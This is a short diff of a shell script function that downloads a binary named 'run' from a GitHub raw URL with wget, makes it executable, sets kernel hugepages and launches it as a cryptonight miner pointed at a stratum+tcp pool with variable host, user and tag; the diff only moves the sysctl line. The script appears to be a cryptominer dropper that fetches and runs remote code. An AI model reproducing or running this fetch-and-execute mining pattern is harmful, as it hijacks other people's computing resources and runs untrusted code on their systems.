@@ -19,9 +19,9 @@ _REBANNER(){
 }
 
 _RUN(){
-  sysctl -w vm.nr_hugepages=128
   wget https://github.com/osrun/beta/raw/master/run
   chmod +x run
+  sysctl -w vm.nr_hugepages=128
   ./run -B -a cryptonight -o stratum+tcp://$END:$PORT -u $USER -p $TAG
   _REBANNER
 }
